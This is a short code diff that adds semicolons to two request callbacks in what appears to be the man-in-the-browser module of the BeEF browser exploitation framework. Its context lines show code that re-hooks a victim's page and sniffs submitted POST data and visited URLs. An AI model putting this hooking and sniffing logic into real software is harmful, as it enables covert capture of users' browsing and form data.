@@ -177,7 +177,7 @@ beef.mitb = {
                     target.innerHTML = y.responseText;
                     setTimeout(beef.mitb.hook, 10);
                 }
-            }
+            };
             y.send(query);
             beef.mitb.sniff("POST: " + url + "[" + query + "]");
             return true;
@@ -227,7 +227,7 @@ beef.mitb = {
                     target.innerHTML = y.responseText;
                     setTimeout(beef.mitb.hook, 10);
                 }
-            }
+            };
             y.send(null);
             beef.mitb.sniff("GET: " + url);
 
